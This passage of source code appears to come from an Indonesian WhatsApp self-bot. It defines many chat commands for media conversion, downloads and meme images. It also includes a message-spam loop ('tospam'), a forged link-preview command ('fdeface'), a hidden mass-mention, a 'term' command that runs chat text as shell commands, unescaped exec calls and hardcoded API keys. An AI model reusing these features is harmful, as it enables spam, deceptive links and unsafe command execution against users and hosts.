                    break	
                    case "tospam":
                      if (isBanned) return reply(mess.ban)
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  syaa.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await syaa.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await syaa.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  syaa.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await syaa.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  syaa.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
   case "vampire":
     
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/vampire?text=${bapakao}&apikey=Ikyy69`)
   break
case "remm":
  if (!isPremium)return reply(mess.prem)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}vampire teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(6)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx5?apikey=hardianto&text=${bapakao}`)
   break
case "lolim":
  if (!isPremium)return reply(mess.prem)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(7)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx2?apikey=hardianto&nama=${bapakao}`)
   break
case "kaneki":
  if (isBanned) return reply(mess.ban)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   reply(mess.wait)
   bapakao = body.slice(8)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gfx1?apikey=hardianto&nama=${bapakao}`)
   break
case "gura":
  if (!isPremium)return reply(mess.prem)
   if (args.length < 1) return reply(from, `Penggunaan ${prefix + command}teks`, mek)
   if (isBanned) return reply(mess.ban)
   reply(mess.wait)
   bapakao = body.slice(6)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/bot/gura?apikey=hardianto&nama=${bapakao}`)
   break
case "neko":
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
   break
case "bajingan":
     
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}bajingan lu teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(10)
   sendStickerFromUrl(from, `https://hardianto-chan.herokuapp.com/api/creator/memegen?bawah=${bapakao}&atas=bajingan&imgurl=https://telegra.ph/file/d608ec3cb57ff6b9ac708.jpg&apikey=hardianto`)
   reply("Succes Buat Fitur Bajingan, Jangan lupa subscribe channel owner : https://youtu.be/OpVvYMn14ik")
   break
case "darkjokes":
  case "darkjoke":
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://hardianto-chan.herokuapp.com/api/darkmeme?apikey=hardianto`)
   break
   case "codetxt":
     
   if (args.length < 1) return reply(from, `Penggunaan ${prefix}codetxt teks`, mek)
   if (isBanned) return reply(mess.ban)
   bapakao = body.slice(9)
   sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/maker/carbon?code=$${bapakao}&apikey=Ikyy69`)
   break
case "matrix":
  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}matrix teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(8)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/matrix?text=${bapakao}&apikey=Ikyy69`)
				break
				case "spiderman":
				  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}spiderman teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(11)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/spider?text=${bapakao}&apikey=Ikyy69`)
				break
				case "express":
				  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}express teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(9)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/express?text=${bapakao}&apikey=Ikyy69`)
				break
				case "dance":
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}dance teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(7)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/dance?text=${bapakao}&apikey=Ikyy69`)
				break
				case "text3d":
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}text3d teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(8)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/text3d?text=${bapakao}&apikey=Ikyy69`)
				break
				case "warrior":
				  
				if (args.length < 1) return reply(from, `Penggunaan ${prefix}warrior teks`, mek)
				if (isBanned) return reply(mess.ban)
				bapakao = body.slice(9)
				sendMediaURL(from, `https://bx-hunter.herokuapp.com/api/flamingtext/warrior?text=${bapakao}&apikey=Ikyy69`)
				break
				case 'd':
				case 'del':
				case 'delete':
					syaa.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
                    case "upswsticker":
                    if (!isOwner && !mek.key.fromMe) return reply(mess.own)    
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case "upswaudio":
                    
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case "upswvoice":
                    
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await syaa.downloadMediaMessage(encmedia)
						syaa.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
      case "upswimage":
        if (isQuotedImage) {
          const swsw = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await syaa.downloadMediaMessage(swsw);
          syaa.sendMessage("status@broadcast", cihcih, image, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Image dengan Caption: ${q}`;
          syaa.sendMessage(from, bur, text, { quoted: mek });
        } else {
          reply("Reply gambarnya!");
        }
        break;
      case "upswvideo":
        if (isQuotedVideo) {
          const swsw = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          cihcih = await syaa.downloadMediaMessage(swsw);
          syaa.sendMessage("status@broadcast", cihcih, video, {
            caption: `${q}`,
          });
          bur = `Sukses Upload Story Video dengan Caption: ${q}`;
          syaa.sendMessage(from, bur, text, { quoted: mek });
        } else {
          reply("reply videonya!");
        }
        break;
      case "fdeface":
        if (isBanned) return reply(mess.ban)
        ge = args.join("");
        var pe = ge.split("|")[0];
        var pen = ge.split("|")[1];
        var pn = ge.split("|")[2];
        var be = ge.split("|")[3];
        const fde = `kirim/reply image dengan capion ${prefix}fdeface link|title|desc|teks`;
        if (args.length < 1) return reply(fde);
        const dipes =
          isQuotedSticker || isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
        const tipes = await syaa.downloadAndSaveMediaMessage(dipes);
        const bufer = fs.readFileSync(tipes);
        const desc = `${pn}`;
        const title = `${pen}`;
        const url = `${pe}`;
        const buu = `https://${be}`;
        var anu = {
          detectLinks: false,
        };
        var mat = await syaa.generateLinkPreview(url);
        mat.title = title;
        mat.description = desc;
        mat.jpegThumbnail = bufer;
        mat.canonicalUrl = buu;
        syaa.sendMessage(from, mat, MessageType.extendedText, anu);
        break;
      case "public":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (banChats === false) return;
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = false;
        reply(`「 *PUBLIC-MODE* 」`);
        break;
      case "self":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (banChats === true) return;
        uptime = process.uptime();
        // var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
        banChats = true;
        reply(`「 *SELF-MODE* 」`);
        break;
      
case 'hidetag': case 'h':
if (!isGroup) return reply(mess.only.group)
var group = await syaa.groupMetadata(from)
var member = group['participants']
var mem = []
member.map( async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var options = {
text: q,
contextInfo: { mentionedJid: mem },
quoted: mek
}
syaa.sendMessage(from, options, text)
break
        case "kntl":
        case "Kntl":
        case "Asu":
        case "Asuu":
        case "ajg":
        case "Anj":
        case "anj":
        case "anjg":
        case "Anjg":
       if (isBanned) return reply(mess.ban)
memek = fs.readFileSync('./30detik/kontol.mp3');
syaa.sendMessage(from, memek, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

      case 'playy':
        if (!isPremium) return reply(mess.prem)
case 'lagu':
if (args.length < 1) return reply('Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(` Playing ${res.all[0].title}`)
let thumbInfo = ` *Youtube Search*
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
/////////////sendMediaURL(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendMediaURL(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`.Playing ${res.all[0].title}`)
let thumbInfo = `*${botname}* 
 *Judul :* ${res.all[0].title}
 *ID Video :* ${res.all[0].videoId}
 *Diupload Pada :* ${res.all[0].ago}
 *Views :* ${res.all[0].views}
 *Durasi :* ${res.all[0].timestamp}
 *Channel :* ${res.all[0].author.name}
*Link Channel :* ${res.all[0].author.url}

*_Tunggu Proses Upload....._*
`
sendMediaURL(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendMediaURL(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case "lah":
case "Lah":
case "Aneh":
case "aneh":
case "kokbisa?":
case "Kokbisa?":
case "Kokbisa":
case "kokbisa":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/ehh.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

case 'play':
  if (!isPremium) return reply(mess.prem)
              if (!q) return reply('Linknya?')
              buttons = [{buttonId: `${prefix}video ${q}`,buttonText:{displayText: `🎥 Video`},type:1},{buttonId:`${prefix}playyy ${q}`,buttonText:{displayText:'🎵 Mp3'},type:1}]
              imageMsg = (await syaa.prepareMessageMedia(fs.readFileSync(`./stik/fake.jpeg`), 'imageMessage', {thumbnail: fs.readFileSync(`./stik/fake.jpeg`)})).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`Silahkan Pilih Media Yg Akan Di Download kak`,buttons,headerType:4}
              prep = await syaa.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              syaa.relayWAMessage(prep)
              break
case 'playyy':
  if (!isPremium) return reply(mess.prem)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
            var srch = args.join('')
    		aramas = await yts(srch);
    		aramat = aramas.all 
   			var mulaikah = aramat[0].url							
                  try {
                    yta(mulaikah)
                    .then((res) => {
                        const { dl_link, thumb, title, filesizeF, filesize } = res
                        axios.get(`https://hardianto-chan.herokuapp.com/api/yt/playmp3?query=${dl_link}&apikey=hardianto`)
                        .then(async (a) => {
                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
                        const captions = `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
                        sendMediaURL(from, thumb, captions)
                        await sendMediaURL(from, dl_link).catch(() => reply('error'))
                        })                
                        })
                        } catch (err) {
                        reply("Erorr")
                        }
                   break
      case 'video':   
        if (!isPremium)return reply(mess.prem)
				  if (args.length < 1) return reply('*Masukan judul nya?*')
                reply('Loading.... ')
				acaa = args.join(" ")
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/yt/playmp4?query=${acaa}&apikey=Ikyy69`)
				if (anu.error) return reply(anu.error)
				infomp3 = `*「 PLAY VIDEO 」*
				
Judul : ${anu.result.title}
Source : ${anu.result.source}
				
*[Wait] Tunggu Sebentar..*`
				///////buffer = await getBuffer(anu.result.thumbnail)
				buffer1 = await getBuffer(anu.result.url_video)
				syaa.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:mek, caption: 'Nih Gan'})
					break
      case "sticker":
      case "stiker":
      case "sg":
      case "s":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          const encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          ran = "666.webp";
          await ffmpeg(`./${media}`)
            .input(media)
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              reply("error");
            })
            .on("end", function () {
              console.log("Finish");
              syaa.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else if (
          ((isMedia && mek.message.videoMessage.seconds < 11) ||
            (isQuotedVideo &&
              mek.message.extendedTextMessage.contextInfo.quotedMessage
                .videoMessage.seconds < 11)) &&
          args.length == 0
        ) {
          const encmedia = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          const media = await syaa.downloadAndSaveMediaMessage(encmedia);
          ran = "999.webp";
          reply(mess.wait);
          await ffmpeg(`./${media}`)
            .inputFormat(media.split(".")[1])
            .on("start", function (cmd) {
              console.log(`Started : ${cmd}`);
            })
            .on("error", function (err) {
              console.log(`Error : ${err}`);
              fs.unlinkSync(media);
              tipe = media.endsWith(".mp4") ? "video" : "gif";
              reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`);
            })
            .on("end", function () {
              console.log("Finish");
              syaa.sendMessage(from, fs.readFileSync(ran), sticker, {
                quoted: mek,
              });
              fs.unlinkSync(media);
              fs.unlinkSync(ran);
            })
            .addOutputOptions([
              `-vcodec`,
              `libwebp`,
              `-vf`,
              `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
            ])
            .toFormat("webp")
            .save(ran);
        } else {
          reply(
            `Kirim gambar dengan caption ${prefix}sticker\nDurasi Sticker Video 1-9 Detik`
          );
        }
        break;
      case "toimg":
        if (isBanned) return reply(mess.ban)
        if (!isQuotedSticker) return reply("𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !");
        reply(mess.wait);
        encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
          .message.extendedTextMessage.contextInfo;
        media = await syaa.downloadAndSaveMediaMessage(encmedia);
        ran = getRandom(".png");
        exec(`ffmpeg -i ${media} ${ran}`, (err) => {
          fs.unlinkSync(media);
          if (err) return reply("Yah gagal, coba ulangi ^_^");
          buffer = fs.readFileSync(ran);
          fakethumb(buffer, "Sukses Convert Sticker To Image");
          fs.unlinkSync(ran);
        });
        break;
        case 'toimg2':
          if (isBanned) return reply(mess.ban)
				if (!isQuotedSticker) return reply('𝗥𝗲𝗽𝗹𝘆/𝘁𝗮𝗴 𝘀𝘁𝗶𝗰𝗸𝗲𝗿 !')
					reply("Loading....")
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await syaa.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply(ind.stikga())
						buffer = fs.readFileSync(ran)
						syaa.sendMessage(from, buffer, image, {quoted: mek, caption: '𝗱𝗮?? 𝗷𝗮𝗱𝗶 '})
						fs.unlinkSync(ran)
					})
				break
      case "ytsearch":
        case "yts":
          if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Tolong masukan query!");
        var srch = args.join("");
        try {
          var aramas = await yts(srch);
        } catch {
          return await syaa.sendMessage(
            from,
            "Error!",
            MessageType.text,
            dload
          );
        }
        aramat = aramas.all;
        var tbuff = await getBuffer(aramat[0].image);
        var ytresult = "";
        ytresult += "「 *YOUTUBE SEARCH* 」";
        ytresult += "\n________________________\n\n";
        aramas.all.map((video) => {
          ytresult += "❏ Title: " + video.title + "\n";
          ytresult += "❏ Link: " + video.url + "\n";
          ytresult += "❏ Durasi: " + video.timestamp + "\n";
          ytresult +=
            "❏ Upload: " + video.ago + "\n________________________\n\n";
        });
        ytresult += "◩ *SELF-BOT*";
        await fakethumb(tbuff, ytresult);
        break;
      case "setreply":
      case "setfake":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!q) return fakegroup(mess.wrongFormat);
        fake = q;
        fakegroup(`Succes Mengganti Conversation Fake : ${q}`);
        break;
      case "setfakeimg":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await syaa.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/fake.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "setthumb":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (
          ((isMedia && !mek.message.videoMessage) ||
            isQuotedImage ||
            isQuotedSticker) &&
          args.length == 0
        ) {
          boij =
            isQuotedImage || isQuotedSticker
              ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                  .extendedTextMessage.contextInfo
              : mek;
          delb = await syaa.downloadMediaMessage(boij);
          fs.writeFileSync(`./stik/thumb.jpeg`, delb);
          reply("Sukses");
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sethumb`);
        }
        break;
      case "ytmp4":
        if (!isPremium) return reply(mess.prem)
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`);
        let isLinks2 = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks2) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          ytv(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 40000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captionsYtmp4);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "emoji":
        case "semoji":
          if (isBanned) return reply(mess.ban)
        if (!q) return fakegroup("emojinya?\nExample : /emoji 🗿");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
      case "ytmp3":
        if (!isPremium) return reply(mess.prem)
        if (args.length === 0)
          return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`);
        let isLinks = args[0].match(
          /(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/
        );
        if (!isLinks) return reply(mess.error.Iv);
        try {
          reply(mess.wait);
          yta(args[0]).then((res) => {
            const { dl_link, thumb, title, filesizeF, filesize } = res;
            axios
              .get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
              .then((a) => {
                if (Number(filesize) >= 30000)
                  return sendMediaURL(
                    from,
                    thumb,
                    `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`
                  );
                const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`;
                sendMediaURL(from, thumb, captions);
                sendMediaURL(from, dl_link).catch(() => reply(mess.error.api));
              });
          });
        } catch (err) {
          reply(mess.error.api);
        }
        break;
      case "image":
      case "gimage":
      case "googleimage":
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Apa Yang Mau Dicari?");
        reply(mess.wait);
        teks = args.join(" ");
        res = await gis(teks, google);
        function google(error, result) {
          if (error) {
            return reply(
              "_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_"
            );
          } else {
            gugIm = result;
            random = gugIm[Math.floor(Math.random() * gugIm.length)].url;
            sendMediaURL(from, random);
          }
        }
        break;

      case "brainly":
        if (isBanned) return reply(mess.ban)
        if (args.length < 1) return reply("Pertanyaan apa");
        brien = args.join(" ");
        brainly(`${brien}`).then((res) => {
          teks = "❉───────────────────────❉\n";
          for (let Y of res.data) {
            teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`;
          }
          syaa.sendMessage(from, teks, text, {
            quoted: mek,
            detectLinks: false,
          });
        });
        break;

      case "igstalk":
        if (isBanned) return reply(mess.ban)
        if (!q) return fakegroup("Usernamenya?");
        ig.fetchUser(`${args.join(" ")}`).then((Y) => {
          console.log(`${args.join(" ")}`);
          ten = `${Y.profile_pic_url_hd}`;
          teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join(
            ""
          )}\n*Full Name* : ${Y.full_name}\n*Bio* : ${
            Y.biography
          }\n*Following* : ${Y.followers}\n*Followers* : ${
            Y.following
          }\n*Private* : ${Y.is_private}\n*Verified* : ${
            Y.is_verified
          }\n\n*Link* : https://instagram.com/${args.join("")}`;
          sendMediaURL(from, ten, teks);
        });
        break;
      case "fb":
        if (isBanned) return reply(mess.ban)
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
      case "term":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!q) return fakegroup(mess.wrongFormat);
        exec(q, (err, stdout) => {
          if (err) return fakegroup(`SELF-BOT:~ ${err}`);
          if (stdout) {
            fakegroup(stdout);
          }
        });
        break;
      case "join":
        if (isBanned) return reply(mess.ban)
        try {
          
          if (!isUrl(args[0]) && !args[0].includes("whatsapp.com"))
            return reply(mess.Iv);
          hen = args[0];
          if (!q) return reply("Masukan link group");
          var codeInvite = hen.split("https://chat.whatsapp.com/")[1];
          if (!codeInvite) return fakegroup("pastikan link sudah mekar!");
          var response = await syaa.acceptInvite(codeInvite);
          reply("SUKSES");
        } catch {
          fakegroup("LINK ERROR!");
        }
        break;
      case "runtime":
      case "test":
        run = process.uptime();
        teks = `${kyun(run)}`;
        fakegroup(teks);
        break;
      case "speed":
      case "ping":
        const timestamp = speed();
        const latensi = speed() - timestamp;
        exec(`neofetch --stdout`, (error, stdout, stderr) => {
          const child = stdout.toString("utf-8");
          const ssd = child.replace(/Memory:/, "Ram:");
          const pingnya = `*${ssd}Speed: ${latensi.toFixed(4)} Second*`;
          fakegroup(pingnya);
        });
        break;
      case "totag":
        if (isBanned) return reply(mess.ban)
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedSticker) &&
          args.length == 0
        ) {
          encmedia = isQuotedSticker
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
            (filename = getRandom())
          );
          value = args.join(" ");
          var group = await syaa.groupMetadata(from);
          var member = group["participants"];
          var mem = [];
          member.map(async (adm) => {
            mem.push(adm.id.replace("c.us", "s.whatsapp.net"));
          });
          var options = {
            contextInfo: { mentionedJid: mem },
            quoted: mek,
          };
          ini_buffer = fs.readFileSync(file);
          syaa.sendMessage(from, ini_buffer, sticker, options);
          fs.unlinkSync(file);
        } else if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          file = await syaa.downloadAndSaveMediaMessage(
            encmedia,
